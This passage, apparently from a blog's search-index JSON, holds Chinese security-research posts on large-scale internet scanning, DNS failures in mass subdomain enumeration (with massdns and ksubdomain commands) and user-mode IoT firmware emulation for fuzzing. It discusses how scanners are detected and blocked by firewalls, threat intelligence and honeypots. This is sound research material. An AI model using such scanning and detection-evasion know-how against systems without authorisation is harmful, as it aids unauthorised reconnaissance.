Github","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://blog.lyle.ac.cn/tags/python/"}]},{"title":"网络空间测绘从1到2：从单机到规模化测绘","slug":"cyberscan","date":"2022-10-25T12:20:04.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2022/10/25/cyberscan/","link":"","permalink":"https://blog.lyle.ac.cn/2022/10/25/cyberscan/","excerpt":"基础的网络空间测绘是存在成熟实践的工程问题，从域名枚举到端口爆破到应用扫描都有着大量可选用的优质工具。但是当测绘目标的数量提高几个数量级时，问题开始变得有些许不同。过量的域名解析请求被域名服务器禁止，大量的端口扫描之后是大量的超时、漏报、误报。如果不解决随着测绘规模扩大而来的问题，当扫描目标量级的不断提升，测绘得到的数据质量将会不断下降。","text":"基础的网络空间测绘是存在成熟实践的工程问题，从域名枚举到端口爆破到应用扫描都有着大量可选用的优质工具。但是当测绘目标的数量提高几个数量级时，问题开始变得有些许不同。过量的域名解析请求被域名服务器禁止，大量的端口扫描之后是大量的超时、漏报、误报。如果不解决随着测绘规模扩大而来的问题，当扫描目标量级的不断提升，测绘得到的数据质量将会不断下降。 为了能更清晰的拆解需求、分析问题、研究解决方案，笔者在尝试进行规模化测绘的工程实践时，对遇到的挑战进行了一些思考和总结，形成了这篇文章，希望能对测绘感兴趣的同学有所帮助。 0. 问题分析在笔者看来，要实现一个有意义的、支持规模化扫描的网络空间测绘工具要关注的是三个核心点：即数据质量、工程实现和数据使用。数据质量要保证扫描结果漏报率、误报率低，面临的是与防火墙和情报的对抗；工程实现要解决的是实际的工程问题，即大量扫描节点的任务分发、调度、监控；数据使用是考虑如何发挥测绘数据的价值。 1. 数据质量最基本的衡量数据质量的指标是漏报率和误报率。即原本不开放的端口被识别为开放，原本开放的端口被识别为不开放。理论上讲，用白IP以相对长的等待时间对目标IP单个端口进行完整的协议交互，获得的数据是干净准确的。然而数据质量是受测绘规模影响最直观的指标。当测绘量级扩大到数亿级时，获得有质量的数据开始变得困难。在现网环境下，造成漏报、误报的原因大部分是与防火墙的对抗和与情报的对抗。 在实际的网络空间中有多种多样的防御产品，这些产品的检测与防御机制都各有不同。有针对扫描工具特征的检测，例如nmap扫描中的报文特征；有针对扫描技术的检测，例如SYN扫描。很多防护设备在检测到一定量级的SYN报文之后，会对所有的SYN报文响应ACK，直到完成TCP三次握手为止。当使用已有的扫描工具时，其扫描策略也是防护设备已知的，即是说，使用公开方案对有防护设备的网络进行扫描，获得的数据质量都是相对有限的。 除了与防护设备对抗之外，在威胁情报逐渐发展的今天，测绘也面临着与情报的对抗。要在有效时间内完成扫描，一个IP通常会发出大量的请求。而测绘量级扩大之后，用于扫描的IP资源和需要扫描的IP空间是不成正比的。对一些能力较强的组织，常见的IP池，如云供应商、代理池、秒拨的IP池通常在情报中。常见的获得大量IP的方式，如云函数、Cloudflare Worker等手段也被拥有较强能力的防守方所禁止。另外在特定时间段，一些激进策略可能会直接禁止掉上述情报中的IP。此外，如果扫描到了蜜罐，用于扫描的IP可能会进入威胁情报中，从而被数个组织联动禁止。 如果使用降低扫描速率来减小被发现概率的方式，时间成本就会成为新的问题。不难想象，如果扫描完IPv4的地址空间需要数个月以上的时间，许多IP地址可能已经重新分配了，一些应用也可能已经经历了上线下线的生命周期从而不再出现。 IPv4测绘面临的挑战是更多是如何用有限的IP获得高质量的结果，而IPv6测绘面临的第一个问题是几乎难以对全IPv6地址空间进行探测。128位的地址空间带来了大量的IP，扫描所有可能的IPv6地址并不是一个现实的问题，因此需要考虑如何找到有效的IPv6地址段。 除了漏报和误报以外，还有一个重要的因素是数据是否完善。不妨假设有以下几份数据： IP为 1.2.3.4 的机器开放了22端口 IP为 1.2.3.4 的机器开放了22端口，端口对应的服务为 OpenSSH 7.4 IP为 1.2.3.4 的机器开放了22端口，端口对应的服务为 OpenSSH 7.4，配置了允许通过密码登录，支持的加密协议有 chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com 很显然，虽然以上几例数据同样都是22端口开放的信息，但是这几例数据的价值是完全不同的。在这个样例中，SSH协议是相对常见的协议，有较为方便的库可以用于提取信息，协议开放端口也是IANA标准定义的标准端口。而在网络空间中，有许多协议并不常见，同时开在非IANA标准所定义的端口中，如果不进行识别与交互，测绘数据的价值将会相对低。 2. 工程实现要解决的第二个核心挑战是如何进行工程实现。 工程实现的挑战也主要是由量级扩大带来的。在单个目标的场景下，DNS子域名爆破到IP端口扫描到应用扫描的路径非常清晰。但是当量级开始扩大时，问题出现了。考虑到单机不能实现大规模的扫描，实际需要分布式场景的解决方案。这引入了新的问题，即任务分发、任务调度、限流与过载保护、隔离、异常检测与恢复、数据存储、监控、日志收集与查询等。当然，这些问题有一些成熟的解决方案，甚至可以从云服务商处直接买到对应的SaaS服务，需要考虑的是如何让这些方案满足测绘场景的需求。 其二，在测绘系统变为复杂的分布式系统后，各种基础环境的可用性不再一定有保证，网络环境、数据库服务、外部服务、内部服务都可能变得不可靠。笔者在之前的文章中有提到DNS服务的不可用性，这实际只是很小一个方面。同时当系统性能开始接近极限时，操作系统也不一定可靠，原本低概率触发的网络抖动、数据错误、资源泄露等场景都可能出现。此外在很多场景下测绘使用云服务商提供的基础服务，由于合规等因素，大规模的扫描也可能触发服务商的封禁策略，导致账号被封禁。 还有一个不能忽略的问题是成本和性能。假设单个IP单次扫描的流量在1M左右，按当前的云服务流量价格计算，1个G的流量费用约为0.8元，而如果不加区分的扫描整个IPv4地址段，流量费用会近百万。这还没有计算存储、设备的费用。因此在工程实现时也需要考虑如何以可接受的成本进行测绘。 小规模的测绘其实是不太需要考虑性能问题的，但是当量级扩大时，性能的损耗会被扩大很多倍，很多参数、算法的选择会带来较大的影响。考虑一种场景，分别设置扫描请求超时等待的时间为5s和6s，在超时任务占总任务20%的情况下，第一种超时设置扫描总耗时10天，那么第二种设置单次扫描会多耗时近5个小时。另一种场景是分布式算法、技术栈选择的不同也对应着不同的性能损耗，考虑算法、实现带来的性能损失在10%左右，那么10天左右的扫描在未优化的情况会多耗时近1天。 3. 数据使用不使用的数据是没有价值的。对企业来说，最基础的测绘数据应用当然是攻击面管理（Attack Surface Management，ASM），根据测绘识别脆弱点进行加固；而在0day漏洞爆发时，全网测绘则能发挥预警、推动修复等作用。 除此之外，不如让我们考虑测绘数据还能做些什么。例如是否能通过对测绘数据的聚类找到新的协议、能否通过对特定协议的扫描预先找到恶意的攻击基础设施并进行预警。 数据使用的需求背后是数据库的支持。最原始的测绘数据仅期望能索引目标，小型的需求开源数据库就可以满足。而当数据量超过百万，普通数据库就需要一定的优化才能在可容忍的时间内查询到结果。继续扩充数据量到超过亿级，可能从数据库选型到库结构到字段定义都需要针对性的优化。 再进一步的考虑，如果存储异构数据，即大量不同的网络协议的数据，就又对数据库提出了新的要求。如HTTP协议需要记录的数据特征是响应，SSH协议需要记录的数据是交互算法。不加优化的存储所有数据到一种数据库、按协议分库都不一定是合适的做法。 再考虑多一步，在大规模测绘时，会希望对数据的产生、转化、消费有比较明确的记录以防止部分错误数据污染整个数据库，这就需要对数据血缘进行管理。 数据库的使用还需要考虑历史数据自动轮换等问题。存储全量数据当然是很有吸引力的方案，但是大量数据的存储成本同样非常高昂。如果想以可接受的成本存储数据，就需要考虑数据分级等问题，即部分数据长久存储，部分数据可以一定时间后删除，部分数据可以一定时间后切换到廉价存储。 参考资料参考文章 New Ways of IPV6 Scanning 性能优先的隐忧：浅谈DNS的不可用性 参考工具https://github.com/stanford-esrg/lzrhttps://github.com/zmap/zgrab2","categories":[{"name":"测绘","slug":"测绘","permalink":"https://blog.lyle.ac.cn/categories/%E6%B5%8B%E7%BB%98/"}],"tags":[{"name":"web","slug":"web","permalink":"https://blog.lyle.ac.cn/tags/web/"}]},{"title":"性能优先的隐忧：浅谈DNS的不可用性","slug":"unreliable-dns","date":"2021-08-21T01:34:39.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2021/08/21/unreliable-dns/","link":"","permalink":"https://blog.lyle.ac.cn/2021/08/21/unreliable-dns/","excerpt":"域名解析服务是计算机网络的重要组成部分，在许多场景下默认域名解析服务是稳定可用的，然而在一些特定的场景下，DNS服务的可用性可能是难以保证的。本文以网络空间测绘中的子域名枚举场景为例，对域名解析服务在特定场景下的可用性做一个简单的测试和分析。","text":"域名解析服务是计算机网络的重要组成部分，在许多场景下默认域名解析服务是稳定可用的，然而在一些特定的场景下，DNS服务的可用性可能是难以保证的。本文以网络空间测绘中的子域名枚举场景为例，对域名解析服务在特定场景下的可用性做一个简单的测试和分析。 引子发现这个问题是在实验网络空间测绘工具时，为了测试工具的可用性，面向子域名枚举工具设计了一个测试场景：使用当前应用较为广泛的子域名测试工具（massdns、ksubdomain）解析Aleax Top 10k的域名，计算最终获取到响应的域名占所有域名的比例。本文通过数次实验后发现可以获取响应的域名实际为总域名数量的70%-90%左右，这个比例可以通过调整参数、降低速率的方式在一定程度上提高，但是总体提升较为有限（在测试过程中，为了排除其他因素的影响，测试环境配置为4核 8G 100Mbps带宽的服务器，在测试过程中计算、存储、网络资源均留有冗余）。通过这个简单的测试实验我们得到了一个初步的想法：在一些极限场景下，DNS服务器的可用性是相对有限的。 感兴趣的读者可以使用以下几条命令复现实验，其中massdns的性能可以通过 --processes &#x2F; --socket-count &#x2F; --hashmap-size 等参数进行调整。 12345wget http://s3.amazonaws.com/alexa-static/top-1m.csv.zip &amp;&amp; unzip -p top-1m.csv.zip | cut -d, -f2 - | head -n 10k &gt; domains.txt./massdns --resolvers ./resolvers.txt \\ --output J --outfile ./out.txt \\ --error-log ./err.log ./domains.txt./ksubdomain -f ./domains.txt -verify 对于产生这个结果的原因，我们尝试从子域名枚举的技术的演进过程进行探究。 子域名枚举技术演进子域名枚举技术是网络空间测绘的重要组成部分，考虑到在测绘过程中目标较多，速度是子域名枚举工具实现时考虑的核心指标之一，这也是子域名枚举工具演进的主线。在枚举子域名时，最直接的实现是使用字典遍历所有可能的子域名并查看是否存在有效的返回，但是这种简单的测试方案几乎无法测试稍大的域名列表。因此出现了第一版方案，即使用多进程、多线程、协程等技术，通过增加单位时间内发送请求的数量来提升子域名枚举的速度。 随着技术的不断发展，zmap使用的无状态探测技术被子域名枚举领域关注，massdns将其应用到了子域名枚举中，该工具仅使用指定数量的数个socket进行网络包的发送和接收操作，在用户层通过hashmap管理网络状态，大幅度提升了子域名枚举的速度。ksubdomain则在massdns上更进一层，使用pcap库直接和网卡进行交互，完成数据包的发送和接收，减少了socket带来的性能开销。ksubdomain同样维护了一个状态表，对于超时的数据自动重传，直至获取到响应或重试测试超过限制为止。除了上述的技术之外还有一些其他的技巧，如预读字典、异步读写、域传送等，本文在此不进行更多的介绍。 一个直观的想法是，上述的工具使用了堪称激进的速度提升方案，那么有着较高的漏报率是可以理解的。但是实际上massdns和ksubdomain都实现了状态表的功能，本文在测试时也在带宽和计算性能上都留出了较高的冗余，将漏报简单归因到高并发带来的丢包或者其他因素上并不正确。随后在进一步的分析中，我们发现高漏报是DNS服务器在部分场景下不可用造成的。 DNS的不可用性在讨论DNS的不可用性之前，本文先对数据的假阴性和假阳性做一下定义。 假阴性：原本存在有效记录的域名，被认为是无效域名。 假阳性：原本无效的域名，被认为是有效的域名。 在实现的测试后，本文通过流量监控的方式对子域名枚举过程进行了更详细的分析，在分析中发现当发送DNS数据报文到达一定量级后，有一些域名解析服务器会表现出严重的不可用性，我们根据服务器的响应表现将其分为为服务宕机、拒绝服务、无响应、返回脏数据几类。 服务宕机服务宕机指DNS响应码为 Server failure ，在RFC 1035中可以查询到对应的定义，该响应表示服务器出现了错误。可以在 wireshark 中 使用 dns.flags.rcode==2 server failure 来过滤出该响应的流量，其在流量中的表现如下图所示。 拒绝服务拒绝服务指DNS响应码为 Refused ，同样可以在RFC 1035中可以查询到对应的定义，该响应表示域名服务器由于配置的原因拒绝了请求。可以在 wireshark 中使用 dns.flags.rcode==5 server refuse 来过滤出该响应的流量，其在流量中的表现如下图所示。 无响应无响应指DNS服务器没有对查询包进行响应，可能是网络抖动造成的丢包、服务器下线等原因，其在流量中的表现如下图所示。 在上图中直至测试到第8个域名解析服务器，才获取到了响应，而在一些极端情况下（带宽占满、大量并发、源IP被禁），可能数十个域名解析服务器都没有响应。 脏数据脏数据是指对于原本应返回NX响应的数据，服务器会返回一个虚假的A记录。以下图的域名为例，对于一个实际不存在的子域名，一些DNS服务器仍然返回了A记录。 经过测试，发现常见的虚假A记录IP如下： 14.36.66.178, 8.7.198.45, 37.61.54.158, 46.82.174.68, 59.24.3.173, 64.33.88.161, 64.33.99.47, 64.66.163.251, 65.104.202.252, 65.160.219.113, 66.45.252.237, 72.14.205.99, 72.14.205.104, 78.16.49.15, 93.46.8.89, 128.121.126.139, 159.106.121.75, 169.132.13.103, 192.67.198.6, 202.106.1.2, 202.181.7.85, 203.161.230.171, 207.12.88.98, 208.56.31.43, 209.36.73.33, 209.145.54.50, 209.220.30.174, 211.94.66.147, 213.169.251.35, 216.221.188.182, 216.234.179.13 这一类的响应就是假阳性数据，这种响应部分是因ISP劫持DNS引发的，部分是由域名污染引发的，具体的介绍可以参考文末的DNS hijacking wiki链接或其他材料。 通过对上述几个场景的分析，我们可以发现，当有一个DNS服务器返回了 Server failure &#x2F; Refused ，域名枚举工具会认为收到了响应，从而停止测试该子域名，即造成假阴性的结果。如果有大量的DNS服务器都没有返回响应至达到域名枚举工具的阈值，同样也会造成假阴性的结果。而只要有一个DNS服务器返回了假阳性的结果，由于枚举工具的状态表特性，就会造成假阳性的结果。 解决方案在实际测试中我们发现，即使是一些使用广泛的域名解析服务提供商，在特定场景中也会表现出上文提到的不可用性，所以这个现象是需要在一些工具的实现中被考虑的。对于网络带宽占满、短时间发起大量DNS请求等场景可能遇到的域名解析服务器不可用问题，本文认为有以下的一些解决方案： 尽量组合使用多个DNSPod、114等较为专业的域名解析服务提供商 在要求服务的稳定性和安全性时，可以使用TCP协议、DNSSEC、DNS over HTTPS进行DNS解析 对解析结果预设一定的ASN或IP范围，或通过黑名单机制去掉应答污染IP的响应 定时检查域名解析服务提供的响应，去掉其中不稳定的域名服务器 参考资料工具 https://github.com/knownsec/ksubdomain https://github.com/blechschmidt/massdns https://github.com/lijiejie/subDomainsBrute https://github.com/aboul3la/Sublist3r 其他链接 RFC 1035: DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION DNS hijacking 从代码角度看各类子域名收集工具 ksubdomain 无状态域名爆破工具","categories":[{"name":"Network","slug":"Network","permalink":"https://blog.lyle.ac.cn/categories/Network/"}],"tags":[{"name":"DNS","slug":"DNS","permalink":"https://blog.lyle.ac.cn/tags/DNS/"}]},{"title":"基于用户态虚拟化的物联网设备仿真方法","slug":"uemu","date":"2021-07-09T14:13:57.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2021/07/09/uemu/","link":"","permalink":"https://blog.lyle.ac.cn/2021/07/09/uemu/","excerpt":"0. 引言对物联网设备中的应用程序进行模糊测试时，直接使用实体设备进行测试是一种比较直接的方法，但是实体测试会带来较高的测试成本，也无法自动化地对待测目标进行测试。考虑到实体设备测试面临的限制，使用虚拟化技术对设备进行测试是一种方案，但是直接使用QEMU仿真并不能保证成功测试目标程序，本文尝试对其中的原因进行分析，并提出一种相对通用的解决方案模型。","text":"0. 引言对物联网设备中的应用程序进行模糊测试时，直接使用实体设备进行测试是一种比较直接的方法，但是实体测试会带来较高的测试成本，也无法自动化地对待测目标进行测试。考虑到实体设备测试面临的限制，使用虚拟化技术对设备进行测试是一种方案，但是直接使用QEMU仿真并不能保证成功测试目标程序，本文尝试对其中的原因进行分析，并提出一种相对通用的解决方案模型。 物联网设备分为多种类型，本文的测试目标主要考虑使用通用操作系统的设备，即拥有轻量级用户空间环境如busybox、uClibc等的Linux类设备环境。在这类设备的环境中，与定制硬件进行的交互大部分是通过特定的设备驱动进行的。 本文分为几个部分，可以按需阅读，第一部分介绍了当前工作，说明在有firmadyne、qiling等强大的工具下为什么还需要有新的仿真工具；第二部分说明了本文解决问题的思路；第三部分对具体实现的一些细节进行说明；最后一部分基于实现完成了一些小规模的实验，说明了本文的仿真能力。如果只是想对本文思路有简单的了解，可以阅读 TL;DR 部分。 TL;DR本文提出的方法在用户层对物联网设备中的网络服务进行仿真用于测试，通过对系统调用分类并在驱动层建立设备模型的思路，实现了成功率较高、相对泛用且易扩展的一种仿真方案。 1. 当前工作1.1 仿真类型仿真的方法可以分为四种类型：全系统仿真、用户态仿真、应用级仿真、代码片段仿真。全系统仿真对整个设备的操作系统进行仿真，运行操作系统的所有组件。用户态仿真，也可以称作进程级仿真，最常见的仿真方式就是使用chroot改变根目录到固件文件系统的目录下，并使用仿真工具的用户模式执行待测程序。 应用级仿真是指并不执行程序，而是仅仅加载网络应用对应页面的方式。最简单的应用级仿真是直接用对应架构的操作系统系统，将网页文件复制出来，使用常用的网络服务启动。但是这种方式会丢失过多的细节，另外很多固件使用了自定义的脚本语言函数来获取硬件配置的信息，因而通过这种方式只能对HTTP服务进行仿真，且只能检测相当有限的漏洞类型，例如命令注入、跨站脚本攻击等。 代码片段仿真则只执行二进制文件中的一部分代码，使用Patch、预设数据等方式使得代码可以正常执行。 1.2 仿真工具在目前，需要仿真这类设备时，通常使用的工具为QEMU、Unicorn等，在这些工具之上有Firmadyne、Qiling等相对完善的框架。QEMU提供用户模式和系统模式两种运行方式，用户模式主要用于执行不同处理器的Linux程序，系统模式用于模拟整个系统运行环境，包括CPU及其他设备，使得系统级的测试更为方便。 在QEMU的基础上，Firmadyne倾向于对整个系统进行仿真，主要考虑解决QEMU在仿真物联网设备时遇到的难点。Firmadyne以系统级仿真为基础，使用定制动态链接库完成库函数劫持支撑NVRAM设备调用，基于定制内核完成操作系统启动、探测网络结构、虚拟硬件，通过系统配置完成网络构建，最后调用QEMU仿真异架构操作系统完成仿真。 但是Firmadyne的方法存在一定的局限性，在Firmadyne获取的23035个固件中，其中8617个固件可以成功解包，在解包成功的固件中有8591个固件能够成功启动系统，成功启动系统的固件中只有2797个可以成功配置网络，最后只有1971个固件可以访问网络。在所有能解包的固件中，仅有22.9%的固件可以通过网络访问，即可以对其进行测试。根据Firmadyne论文中的解释，不能成功仿真主要是因为提取固件失败、NVRAM仿真失败、网络设备仿真失败等原因。 Qiling提供了非常强大的跨平台与跨架构的二进制仿真能力，可以对二进制文件或者代码片段进行仿真，可以进行自动化patch。但是并不是物联网设备专用的工具，在仿真设备时仍需要一定的手动分析。 虽然当前工具已经解决了很多问题，但是但是在测试目标上仍然有局限性。如果要对型号多样的物联网设备进行测试，需要找到一种较为合适的仿真方式。在已有工具的基础上，本文尝试提出一种仿真成功率高、更容易调试与扩展的方案，可以更简单的对物联网设备中的二进制文件进行仿真，从而进行测试。 2. 问题分析与解决2.1 面临挑战比较泛泛的讲，物联网设备难以仿真的主要原因是运行环境复杂，设备由很多不同厂商生产，仅路由设备常见的厂家就超过四十余家。而各个厂商会提供不同系列和型号的产品，不同产品又使用各种不同的硬件、指令集架构、操作系统、网络协议。其中部分产品依赖自研的外部设备，部分产品会对操作系统进行深度自定制，网络协议可能会有自研的通信格式，最后衍生出复杂的软硬件依赖问题。尤其是物联网设备的自研部分往往是闭源的，各个厂商对协议、外部设备有不同标准和实现，这些非标准的协议和设备实现多不公开，继续加大了仿真的困难程度。 更具体来说，可以把二进制程序的执行分为两部分，用户态和内核态。用户态的指令可以由通用的仿真工具来翻译执行，而最终进入内核态的系统调用需要进一步构建执行环境解决。也就是说，仿真要解决的问题实际是如何执行系统调用的问题。 而在具体的仿真方案选择上，全系统仿真引入了不必要的复杂性，应用级仿真缺少细节，代码片段仿真更适合测试一部分功能或调试漏洞，因此本文的目标是通过构建合适的系统调用模型来在用户态执行物联网设备中的二进制程序。 2.2 解决模型系统调用有很多种分类方式，其中一种分类方式是将系统调用分为进程控制、文件管理、设备管理、信息维护、通信、保护六大类，本文在这个分类的基础上继续对问题进行解决。 进程控制类系统调用主要用于完成创建进程、终止进程、载入与执行进程、获取进程属性、等待时间事件与信号、申请与释放内存等功能。文件管理类系统调用主要用于完成创建删除文件、打开关闭文件、读写文件、读取或设置文件属性等功能。设备管理类系统调用主要用于完成获取与释放设备实例、读取或设置设备属性、挂载或卸载设备等功能。信息维护类系统调用主要用于传递信息，例如当前的事件、日期、用户数、操作系统版本、内存或磁盘信息等。通信类系统调用负责进程间通信，实现常用的消息传递模型和共享内存模型等功能。保护类系统调用负责设置资源权限，用于允许和拒绝用户访问特定资源。 其中信息维护、通信、保护间通信三类系统调用宿主机可以较为容易的支撑，而其他几类系统调用在从模拟器环境向宿主机环境转发时则存在如下图所示的几个需要解决的问题。 2.2.1 文件管理进程在执行时，会需要进程本身的可执行文件、可执行文件对应的动态链接库文件、用于配置程序的配置文件，以及用于写入临时文件、日志文件、进程当前信息的目录等文件与目录环境。在仿真时通常会通过加载原本固件的文件系统的方式来构建文件系统的运行环境，但是在由于设备固件并不遵循统一的标准，提取出的文件系统可能并不完整，会存在部分文件无法找到的情况。另外，有的文件由设备在运行时动态创建，简单的文件系统提取并不能获取对应的文件。 2.2.2 设备管理物联网设备通常需要大量的外部硬件设备参与运行，主要是运算与控制设备、网络设备、存储设备与输入输出设备。模拟器仅对常见的硬件设备进行了支持，其中包含了运算与控制设备、部分内存与磁盘设备、部分输入输出设备。但是物联网设备中存在着大量的定制外部设备，如定制的NVRAM、Flash存储设备、网络设备等，在执行到和这些设备相关的系统调用时，可能会面临缺少输入输出设备与网络设备，设备的硬件调用宿主机不支持等问题。 2.2.3 进程控制待测的可执行程序和宿主机大多是不同架构的，需要通过模拟器执行。而在通过用户态模拟执行新的程序时，由于系统调用被转发到了宿主机，宿主机将以正常的进程加载方式加载程序，但是不同架构的程序在默认场景下并不受宿主机支持，此时程序无法被执行，父进程报错终止。 3. 具体实现3.1 系统调用劫持系统调用劫持主要是基于ptrace控制系统调用，在一些检查环境的系统调用处实现控制，获取相关信息的同时屏蔽一些不重要的报错，使得程序可以正常运行。 基于ptrace的方案的缺点在于性能消耗较高，每次系统调用都需要有对应的逻辑判断。为了减少这种消耗，在长期测试时可以根据收集到的信息生成对应的内核模块代码，编译为内核模块，在后续需要屏蔽、修改部分系统调用或用户态调用的情况下，使用基于Linux内核模块控制系统调用的方案完成持久化。 3.2 设备文件系统重建进程运行所需要的文件主要是进程本身的可执行文件与对应的链接库文件，系统的设备与配置文件，进程的配置文件与进程在运行时产生的进程信息、日志文件、临时文件几种类型的文件。其中从固件提取出的文件系统包含有可执行文件、动态链接库文件、操作系统的配置文件，正常情况下，操作系统在启动后会创建系统的设备文件、用于写入日志文件的目录与各个程序的配置文件。 满足文件依赖从下至上分为四个层次来对缺失的文件进行补全，第一层挂载固件文件系统，这一层是执行的基础；第二层根据运行时信息动态创建缺失的文件，这一层在可执行文件的基础上创建部分所需的文件；第三层覆盖特定的系统配置文件，这一层用于对配置进行归一化方便进行后续的测试；第四层是根据对指纹、配置文件的解析创建应用对应的配置文件，这一层是在之前的基础上进行细节的修正，保证待测程序可以正常运行。 用于挂载的文件系统来自于之前通过解包固件获取的文件系统，主要包括可执行的二进制文件与对应的动态链接库。 动态创建的文件主要是本应在Linux系统启动时创建的文件，主要是 var 目录下的多个子目录与文件，proc、sys、dev等目录，这些文件与目录在待测程序启动前进行通过宿主机进行创建或挂载。 之后覆盖系统基本的配置文件，这类文件可能存在于固件中或不存在，但是格式都是已知的。系统基本的配置文件包括passwd、shadow等用户相关的配置、DNS服务器等网络相关的配置，还有TZ、localtime等时间相关配置。因为固件生态的多样性，这些文件可能存在自定义的部分，为了测试环境的统一化，本文使用预置的系统配置文件对这些文件进行覆盖。 最后一部分是动态运行所需要的内容，主要是不同类型的服务需要不同的配置文件，同一类型不同实现的服务也需要不同的配置文件，这些配置文件往往是根据设备状态动态创建出来的，并不存在于固件中。不同类型的服务器例如DNS服务启动所需要的dnsmasq.conf，PPTP服务启动所需要的pptdp.conf，SMB服务启动所需要的smb.conf。同一类型的服务也存在不同实现，以HTTP协议为例，存在lighttpd、mini_httpd、mathopd等多个大类的实现，不同应用所需要的配置类型和位置是不同的。 对于同一类型不同实现的服务，本文根据程序的类型和当前环境动态创建配置文件，执行文件并进行测试。如果程序执行成功则保留该配置文件，如果执行失败则尝试其他参数与配置文件。如果预置的配置文件不能成功，则分析固件中的系统脚本，主要是初始化文件，从中找出配置文件的生成方式与程序的执行参数，并进行相应的执行来创建配置文件。 3.4 基于定制内核模块的硬件模拟用户进程和硬件的交互过程如下图所示，用户态程序加载动态链接库，动态链接库根据标准用户库中的标准输入输出相关的函数构造对应的系统调用转发到内核层，内核根据系统调用对应执行设备驱动中的代码。 对于缺少外部设备的问题，Firmadyne的解决方案是通过自定义的用户态动态链接库在软件层劫持相关的调用来实现。Firmadyne自定义了用户态的动态链接库，通过预加载的方式通过该链接库控制对硬件的调用，当用户态应用调用对应函数的时候，会优先调用自定义的用户态标准库，从而实现用户态的NVRAM功能。 但是这种方式存在几个问题，首先，基于劫持的方式需要了解上层应用调用的函数名称，Firmadyne仅仅通过枚举来解决，一旦遇到没有在枚举列表中的函数，运行就会出现错误。其次，这种方式仅支持NVRAM一种设备，可扩展性差，无法适应其他的设备。另外，对于每一种架构，这种方式都要编译一个对应的动态链接库文件，需要维护多套编译环境。 考虑到Firmadyne的缺陷，本文主要使用定制内核模块的方式来实现虚拟的设备。在Linux操作系统中，硬件设备也被看做文件来处理，有对应的文件标准操作。除此之外，在Linux的设计中，驱动定义的标准仅有数次比较小的修改，可以较为容易的枚举出所有的驱动操作。具体来说，POSIX的内核驱动标准中仅定义了read、write、ioctl等数种意义较为明确的硬件操作，也在一定程度上减轻了实现的难度。本文最后根据驱动定义标准设计内核模块，对于每一种设备，以内核驱动的方式，模拟实现文件的标准操作，通过定制内核模块完成外部设备的软件形式实现。 根据Firmadyne的分析，52.6%的固件都通过用户态链接库访问了NVRAM，大部分固件的核心设备也以NVRAM为主，因此本文同样主要关注NVRAM的实现。NVRAM可以看作一个硬件实现的哈希表，用户可以通过键值对的形式向NVRAM写入需要存储的变量，也可以通过输入特定的KEY值来读取之前存储的数据。基于NVRAM的输入输出特点，本文在软件层进行了一个哈希表的实现，并完成了对应的驱动，加载驱动后，设备可以按照正常的NVRAM调用方式进行运行。和Firmadyne相比，本文的实现方式更加通用，且能够更好的处理系统调用的情况。 在本文的实现方式下，每种设备仅需要对应实现几个驱动的函数即可，不需要适配同一设备的不同用户态调用。另外因为本文的硬件实现最后挂载在宿主机中，系统调用的翻译已经在用户态模拟完成，所以这种方式并不需要对不同的架构进行适配。 除了I&#x2F;O设备之外，物联网设备可能会依赖一些特定的网络外设，这部分本文在基于系统调用劫持获取信息的基础上，创建一张对应名称和IP的网卡，并使用桥接的方式和本地网卡连接，以用于后续的测试中。 除了IO设备与网络设备，还有类似LED等少数附加设备，这些设备通常有专门的可执行文件控制，网络服务程序并不直接和这些设备进行交互，对于这部分设备，本文使用前文中提到的系统调用劫持直接屏蔽对应的系统调用。 3.5 进程透明启动如前文中提到的，部分进程在执行时会进行execve、fork等系统调用操作，而因为本文使用了转发系统调用到宿主机的方式，在使用这些系统调用时，进程会脱离模拟器环境，由操作系统来执行程序。 操作系统加载可执行文件时，会默认按照宿主机架构加载程序代码，进行解释执行。显而易见的，宿主机在默认情况下无法处理异架构的程序，对于这个问题，本文提出了一种基于内核配置的跨架构进程透明启动技术。 无论用户层使用什么方式创建一个新进程，最后都会通过execve等系统调用传递信息至操作系统，由操作系统内核寻找对应格式的处理器来执行对应的进程。本文注册内核的执行函数，在涉及execve、fork脱离模拟器环境时调用execve时进行判断，如果当前载入的程序并非宿主机架构的程序，则载入对应的模拟器环境加载该程序用于执行，防止程序脱离当前定制的用户态仿真环境执行。 关于其中具体工具的使用和配置，可以参考这篇文章 。 4. 实验数据为了验证仿真工具的能力，设计了一些简单的实验进行测试。本文主要使用网页爬取与FTP同步的方式，基于网页的爬虫自动解析厂商的固件下载页面并下载固件；基于FTP同步的方式主要同步厂商FTP中与固件相关的文件，例如后缀是zip、bin、pkg等结尾的固件。另外考虑到实验的多样性，也手工下载了一些品牌的固件用作实验。 经过爬取，本文一共得到来自46个厂商的14483个固件作为测试集，用于验证测试模式的产生效率以及实际的测试实验。固件数据集中比较多数的是路由设备的固件，也包含一些摄像头、NAS的固件。固件中包含i386、ARM、MIPS、PowerPC，并有对应的32位、64位、大小端等多种不同架构。由于不同厂商对固件开放的程度不同、产品数量不同，在数据库中部分厂商如D-Link、TP-Link等厂商的固件占了较大的比例。 总计爬取了14483个固件，其中因为文件格式没有成功识别、解压缩或解密错误、固件中不包含正常可执行文件等原因，有6495个固件不能正确解包，本文对正确解包的7989个固件进行实验。 以应用程序为维度衡量仿真能力，本文判定应用程序是否仿真成功的标准为：使用编写好的测试程序发送对应协议的请求报文，对应端口返回了协议对应的正确响应时，认为仿真成功，否则认为仿真失败。 基于这个标准，本文对仿真成功的程序架构与类型分别进行了统计，在仿真成功的程序中，各个架构程序的数量如下表所示。由于有大量的固件使用了同样的可执行文件，本文在统计中分别统计了执行成功的程序数量与根据哈希去重后的程序数量。 架构 位长 大小端 程序数量 去重后数量 arm 32 big 857 13 arm 32 little 730 89 i386 32 little 767 8 mips 32 big 19472 629 mips 32 little 9445 469 mips64 64 big 40 11 powerpc 32 big 60 4 在仿真成功的程序中，程序数量如下表所示，因为每个固件中存在的程序数量与类型不同，所以在表中，不同程序的数量和比例有所不同。其中部分程序对应的比例较小，这是由于不是所有固件都带有对应的功能，例如只有小部分固件存在UPnP相关的服务程序，而大部分的固件中都存在DNS相关的服务程序。 程序名称 程序数量 去重后数量 dnsmasq 7610 147 hnap 12 3 httpd 6899 181 lighttpd 90 